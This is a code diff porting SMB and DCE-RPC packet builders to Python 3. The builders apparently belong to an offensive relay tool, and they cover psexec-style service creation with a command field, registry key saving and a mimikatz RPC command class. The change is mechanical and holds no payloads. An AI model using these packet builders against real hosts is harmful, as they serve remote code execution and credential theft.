@@ -492,8 +506,8 @@ class SMBNTCreateData(Packet):
 
     def calculate(self):
         Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
-        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
-        self.fields["Bcc"] = struct.pack("<h",len(Data1))
+        self.fields["FileNameLen"] = StructWithLenPython2or3("<h",len(str(self.fields["FileName"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(Data1))
 
 class SMBNTCreateDataSVCCTL(Packet):
     fields = OrderedDict([
@@ -509,7 +523,7 @@ class SMBNTCreateDataSVCCTL(Packet):
         ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
         ("FileAttrib",    "\x00\x00\x00\x00"),
         ("ShareAccess",   "\x07\x00\x00\x00"),
-        ("Disposition",   "\x01\x00\x00\x00"),   
+        ("Disposition",   "\x01\x00\x00\x00"),
         ("CreateOptions", "\x00\x00\x00\x00"),
         ("Impersonation", "\x02\x00\x00\x00"),
         ("SecurityFlags", "\x00"),
@@ -520,15 +534,15 @@ class SMBNTCreateDataSVCCTL(Packet):
 
     def calculate(self):
         Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
-        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
-        self.fields["Bcc"] = struct.pack("<h",len(Data1))
+        self.fields["FileNameLen"] = StructWithLenPython2or3("<h",len(str(self.fields["FileName"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(Data1))
 
 class SMBLockingAndXResponse(Packet):
     fields = OrderedDict([
         ("Wordcount",     "\x02"),
         ("AndXCommand",   "\xff"),
         ("Reserved",      "\x00"),
-        ("Andxoffset",    "\x00\x00"),  
+        ("Andxoffset",    "\x00\x00"),
         ("Bcc",           "\x00\x00"),
     ])
 
@@ -539,18 +553,18 @@ class SMBReadData(Packet):
         ("Reserved",      "\x00" ),
         ("Andxoffset",    "\x00\x00"),
         ("FID",           "\x00\x00"),
-        ("Offset",        "\x19\x03\x00\x00"), 
+        ("Offset",        "\x19\x03\x00\x00"),
         ("MaxCountLow",   "\xed\x01"),
         ("MinCount",      "\xed\x01"),
         ("Hidden",        "\xff\xff\xff\xff"),
-        ("Remaining",     "\x00\x00"),  
+        ("Remaining",     "\x00\x00"),
         ("Bcc",           "\x00\x00"),
         ("Data", ""),
     ])
 
     def calculate(self):
 
-        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
 
 class SMBWriteData(Packet):
     fields = OrderedDict([
@@ -566,7 +580,7 @@ class SMBWriteData(Packet):
         ("DataLenHi",     "\x00\x00"),
         ("DataLenLow",    "\xdc\x02"),
         ("DataOffset",    "\x40\x00"),
-        ("HiOffset",      "\x00\x00\x00\x00"),   
+        ("HiOffset",      "\x00\x00\x00\x00"),
         ("Bcc",           "\xdc\x02"),
         ("Padding",       "\x41"),
         ("Data", ""),
@@ -574,8 +588,8 @@ class SMBWriteData(Packet):
 
     def calculate(self):
 
-        self.fields["DataLenLow"] = struct.pack("<H",len(str(self.fields["Data"])))
-        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))
+        self.fields["DataLenLow"] = StructWithLenPython2or3("<H",len(str(self.fields["Data"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<H",len(str(self.fields["Data"])))
 
 class SMBDCERPCWriteData(Packet):
     fields = OrderedDict([
@@ -591,15 +605,15 @@ class SMBDCERPCWriteData(Packet):
         ("DataLenHi",     "\x00\x00"),
         ("DataLenLow",    "\xdc\x02"),
         ("DataOffset",    "\x3f\x00"),
-        ("HiOffset",      "\x00\x00\x00\x00"),   
+        ("HiOffset",      "\x00\x00\x00\x00"),
         ("Bcc",           "\xdc\x02"),
         ("Data", ""),
     ])
 
     def calculate(self):
-        self.fields["Remaining"] = struct.pack("<h",len(str(self.fields["Data"])))
-        self.fields["DataLenLow"] = struct.pack("<h",len(str(self.fields["Data"])))
-        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))
+        self.fields["Remaining"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
+        self.fields["DataLenLow"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(str(self.fields["Data"])))
 
 
 
@@ -633,24 +647,24 @@ class SMBTransDCERPC(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["Data"]))%2==0:
-           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
+            self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
         else:
-           self.fields["PipeTerminator"] = "\x00\x00\x00"
+            self.fields["PipeTerminator"] = "\x00\x00\x00"
         ##Convert Path to Unicode first before any Len calc.
-        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')
+        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le').decode('latin-1')
 
         ##Data Len
-        self.fields["TotalDataCount"] = struct.pack("<h", len(str(self.fields["Data"])))
-        self.fields["DataCount"] = struct.pack("<h", len(str(self.fields["Data"])))
+        self.fields["TotalDataCount"] = StructWithLenPython2or3("<h", len(str(self.fields["Data"])))
+        self.fields["DataCount"] = StructWithLenPython2or3("<h", len(str(self.fields["Data"])))
 
         ##Packet len
         FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["OpNum"])+str(self.fields["FID"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])
 
-        self.fields["ParamOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
-        self.fields["DataOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
+        self.fields["ParamOffset"] = StructWithLenPython2or3("<h", len(FindRAPOffset)+32)
+        self.fields["DataOffset"] = StructWithLenPython2or3("<h", len(FindRAPOffset)+32)
         ##Bcc Buff Len
         BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
-        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h", len(BccComplete))
 
 
 class SMBDCEData(Packet):
@@ -682,7 +696,7 @@ class SMBDCEData(Packet):
         Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["MaxTransFrag"])+str(self.fields["MaxRecvFrag"])+str(self.fields["GroupAssoc"])+str(self.fields["CTXNumber"])+str(self.fields["CTXPadding"])+str(self.fields["CTX0ContextID"])+str(self.fields["CTX0ItemNumber"])+str(self.fields["CTX0UID"])+str(self.fields["CTX0UIDVersion"])+str(self.fields["CTX0UIDVersionlo"])+str(self.fields["CTX0UIDSyntax"])+str(self.fields["CTX0UIDSyntaxVer"])
 
 
-        self.fields["FragLen"] = struct.pack("<h",len(Data1))
+        self.fields["FragLen"] = StructWithLenPython2or3("<h",len(Data1))
 
 class SMBDCEPacketData(Packet):
     fields = OrderedDict([
@@ -705,8 +719,8 @@ class SMBDCEPacketData(Packet):
 
         Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["AllocHint"])+str(self.fields["ContextID"])+str(self.fields["Opnum"])+str(self.fields["Data"])
 
-        self.fields["FragLen"] = struct.pack("<h",len(Data1))
-        self.fields["AllocHint"] = struct.pack("<i",len(str(self.fields["Data"])))
+        self.fields["FragLen"] = StructWithLenPython2or3("<h",len(Data1))
+        self.fields["AllocHint"] = StructWithLenPython2or3("<i",len(str(self.fields["Data"])))
 
 ###Psexec
 class SMBDCESVCCTLOpenManagerW(Packet):
@@ -724,13 +738,13 @@ class SMBDCESVCCTLOpenManagerW(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["MachineName"]))%2==0:
-           self.fields["MachineNameNull"] = "\x00\x00\x00\x00"
+            self.fields["MachineNameNull"] = "\x00\x00\x00\x00"
         else:
-           self.fields["MachineNameNull"] = "\x00\x00"
+            self.fields["MachineNameNull"] = "\x00\x00"
         ## Convert to UTF-16LE
-        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
-        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
-        self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le')
+        self.fields["MaxCount"] = StructWithLenPython2or3("<i",len(str(self.fields["MachineName"]))+1)
+        self.fields["ActualCount"] = StructWithLenPython2or3("<i",len(str(self.fields["MachineName"]))+1)
+        self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le').decode('latin-1')
 
 class SMBDCESVCCTLCreateService(Packet):
     fields = OrderedDict([
@@ -761,7 +775,7 @@ class SMBDCESVCCTLCreateService(Packet):
         ("DependenciesLen",      "\x00\x00\x00\x00"),
         ("ServiceStartUser",     "\x00\x00\x00\x00"),
         ("Password",             "\x00\x00\x00\x00"),
-        ("PasswordLen",          "\x00\x00\x00\x00"), 
+        ("PasswordLen",          "\x00\x00\x00\x00"),
         ("Padding",              "\x00\x00"),
 
     ])
@@ -771,22 +785,22 @@ class SMBDCESVCCTLCreateService(Packet):
 
         #Padding
         if len(str(self.fields["BinCMD"]))%2==0:
-           self.fields["LoadOrderGroup"] = "\x00\x00\x00\x00"
+            self.fields["LoadOrderGroup"] = "\x00\x00\x00\x00"
         else:
-           self.fields["LoadOrderGroup"] = "\x00\x00"
+            self.fields["LoadOrderGroup"] = "\x00\x00"
 
         ## Calculate first
-        self.fields["BinPathMaxCount"] = struct.pack("<i",len(BinDataLen)+1)
-        self.fields["BinPathActualCount"] = struct.pack("<i",len(BinDataLen)+1)
-        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
-        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
-        self.fields["MaxCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
-        self.fields["ActualCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
+        self.fields["BinPathMaxCount"] = StructWithLenPython2or3("<i",len(BinDataLen)+1)
+        self.fields["BinPathActualCount"] = StructWithLenPython2or3("<i",len(BinDataLen)+1)
+        self.fields["MaxCount"] = StructWithLenPython2or3("<i",len(str(self.fields["ServiceName"]))+1)
+        self.fields["ActualCount"] = StructWithLenPython2or3("<i",len(str(self.fields["ServiceName"]))+1)
+        self.fields["MaxCountRefID"] = StructWithLenPython2or3("<i",len(str(self.fields["DisplayNameID"]))+1)
+        self.fields["ActualCountRefID"] = StructWithLenPython2or3("<i",len(str(self.fields["DisplayNameID"]))+1)
 
         ## Then convert to UTF-16LE
-        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')
-        self.fields["DisplayNameID"] = self.fields["DisplayNameID"].encode('utf-16le')
-        self.fields["BinCMD"] = self.fields["BinCMD"].encode('utf-16le')
+        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le').decode('latin-1')
+        self.fields["DisplayNameID"] = self.fields["DisplayNameID"].encode('utf-16le').decode('latin-1')
+        self.fields["BinCMD"] = self.fields["BinCMD"].encode('utf-16le').decode('latin-1')
 
 class SMBDCESVCCTLOpenService(Packet):
     fields = OrderedDict([
@@ -802,14 +816,14 @@ class SMBDCESVCCTLOpenService(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["ServiceName"]))%2==0:
-           self.fields["ServiceNameNull"] = "\x00\x00\x00\x00"
+            self.fields["ServiceNameNull"] = "\x00\x00\x00\x00"
         else:
-           self.fields["ServiceNameNull"] = "\x00\x00"
+            self.fields["ServiceNameNull"] = "\x00\x00"
         ## Calculate first
-        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
-        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
+        self.fields["MaxCount"] = StructWithLenPython2or3("<i",len(str(self.fields["ServiceName"]))+1)
+        self.fields["ActualCount"] = StructWithLenPython2or3("<i",len(str(self.fields["ServiceName"]))+1)
         ## Then convert to UTF-16LE
-        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le')
+        self.fields["ServiceName"] = self.fields["ServiceName"].encode('utf-16le').decode('latin-1')
 
 class SMBDCESVCCTLStartService(Packet):
     fields = OrderedDict([
@@ -848,9 +862,9 @@ class SMBDCEMimiKatzRPCCommand(Packet):
     ])
 
     def calculate(self):
-        self.fields["ContextHandleLen"] = struct.pack("<i",len(str(self.fields["CMD"]))+1)
-        self.fields["ContextHandleLen2"] = struct.pack("<i",len(str(self.fields["CMD"]))+1)
-        self.fields["CMD"] = self.fields["CMD"].encode('utf-16le')
+        self.fields["ContextHandleLen"] = StructWithLenPython2or3("<i",len(str(self.fields["CMD"]))+1)
+        self.fields["ContextHandleLen2"] = StructWithLenPython2or3("<i",len(str(self.fields["CMD"]))+1)
+        self.fields["CMD"] = self.fields["CMD"].encode('utf-16le').decode('latin-1')
 
 
 class OpenAndX(Packet):
@@ -875,7 +889,7 @@ class OpenAndX(Packet):
 
     ])
     def calculate(self):
-        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Terminator"])+str(self.fields["File"])+str(self.fields["FileNull"])))
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(str(self.fields["Terminator"])+str(self.fields["File"])+str(self.fields["FileNull"])))
 
 class ReadRequest(Packet):
     fields = OrderedDict([
@@ -937,7 +951,7 @@ class WriteRequestAndX(Packet):
         ("DataLenLow",            "\x0a\x00"),#actual Len
         ("DataOffset",            "\x3f\x00"),
         ("Bcc",                   "\x0a\x00"),
-        ("Padd",                  ""), 
+        ("Padd",                  ""),
         ("Data",                  ""),
 
     ])
@@ -963,8 +977,8 @@ class DeleteFileRequest(Packet):
     ])
 
     def calculate(self):
-        self.fields["File"] = self.fields["File"].encode('utf-16le')
-        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["BuffType"])+str(self.fields["File"])+str(self.fields["FileNull"])))
+        self.fields["File"] = self.fields["File"].encode('utf-16le').decode('latin-1')
+        self.fields["Bcc"] = StructWithLenPython2or3("<h",len(str(self.fields["BuffType"])+str(self.fields["File"])+str(self.fields["FileNull"])))
 
 class SMBEcho(Packet):
     fields = OrderedDict([
@@ -1008,17 +1022,17 @@ class SMBDCEWinRegOpenKey(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["Key"]))%2==0:
-           self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
+            self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
         else:
-           self.fields["KeyTerminator"] = "\x00\x00"
+            self.fields["KeyTerminator"] = "\x00\x00"
         #Calc first.
-        self.fields["ActualKeyMaxSize"] = struct.pack("<i",len(str(self.fields["Key"]))+1)
-        self.fields["ActualKeySize"] = struct.pack("<i",len(str(self.fields["Key"]))+1)
+        self.fields["ActualKeyMaxSize"] = StructWithLenPython2or3("<i",len(str(self.fields["Key"]))+1)
+        self.fields["ActualKeySize"] = StructWithLenPython2or3("<i",len(str(self.fields["Key"]))+1)
         #Convert to unicode.
-        self.fields["Key"] = self.fields["Key"].encode('utf-16le')
+        self.fields["Key"] = self.fields["Key"].encode('utf-16le').decode('latin-1')
         #Recalculate again, in unicode this time.
-        self.fields["KeySizeUnicode"] = struct.pack("<h",len(str(self.fields["Key"]))+2)
-        self.fields["MaxKeySizeUnicode"] = struct.pack("<h",len(str(self.fields["Key"]))+2)
+        self.fields["KeySizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["Key"]))+2)
+        self.fields["MaxKeySizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["Key"]))+2)
 
 
 class SMBDCEWinRegQueryInfoKey(Packet):
@@ -1069,17 +1083,17 @@ class SMBDCEWinRegCreateKey(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["KeyName"]))%2==0:
-           self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
+            self.fields["KeyTerminator"] = "\x00\x00\x00\x00"
         else:
-           self.fields["KeyTerminator"] = "\x00\x00"
+            self.fields["KeyTerminator"] = "\x00\x00"
         #Calc first.
-        self.fields["ActualKeyMaxSize"] = struct.pack("<i",len(str(self.fields["KeyName"]))+1)
-        self.fields["ActualKeySize"] = struct.pack("<i",len(str(self.fields["KeyName"]))+1)
+        self.fields["ActualKeyMaxSize"] = StructWithLenPython2or3("<i",len(str(self.fields["KeyName"]))+1)
+        self.fields["ActualKeySize"] = StructWithLenPython2or3("<i",len(str(self.fields["KeyName"]))+1)
         #Convert to unicode.
-        self.fields["KeyName"] = self.fields["KeyName"].encode('utf-16le')
+        self.fields["KeyName"] = self.fields["KeyName"].encode('utf-16le').decode('latin-1')
         #Recalculate again, in unicode this time.
-        self.fields["KeySizeUnicode"] = struct.pack("<h",len(str(self.fields["KeyName"]))+2)
-        self.fields["MaxKeySizeUnicode"] = struct.pack("<h",len(str(self.fields["KeyName"]))+2)
+        self.fields["KeySizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["KeyName"]))+2)
+        self.fields["MaxKeySizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["KeyName"]))+2)
 
 class SMBDCEWinRegSaveKey(Packet):
     fields = OrderedDict([
@@ -1098,16 +1112,14 @@ class SMBDCEWinRegSaveKey(Packet):
     def calculate(self):
         #Padding
         if len(str(self.fields["File"]))%2==0:
-           self.fields["FileTerminator"] = "\x00\x00\x00\x00"
+            self.fields["FileTerminator"] = "\x00\x00\x00\x00"
         else:
-           self.fields["FileTerminator"] = "\x00\x00"
+            self.fields["FileTerminator"] = "\x00\x00"
         #Calc first.
-        self.fields["ActualFileMaxSize"] = struct.pack("<i",len(str(self.fields["File"]))+1)
-        self.fields["ActualFileSize"] = struct.pack("<i",len(str(self.fields["File"]))+1)
+        self.fields["ActualFileMaxSize"] = StructWithLenPython2or3("<i",len(str(self.fields["File"]))+1)
+        self.fields["ActualFileSize"] = StructWithLenPython2or3("<i",len(str(self.fields["File"]))+1)
         #Convert to unicode.
-        self.fields["File"] = self.fields["File"].encode('utf-16le')
+        self.fields["File"] = self.fields["File"].encode('utf-16le').decode('latin-1')
         #Recalculate again, in unicode this time.
-        self.fields["FileSizeUnicode"] = struct.pack("<h",len(str(self.fields["File"]))+2)
-        self.fields["MaxFileSizeUnicode"] = struct.pack("<h",len(str(self.fields["File"]))+2)
-
-
+        self.fields["FileSizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["File"]))+2)
+        self.fields["MaxFileSizeUnicode"] = StructWithLenPython2or3("<h",len(str(self.fields["File"]))+2)
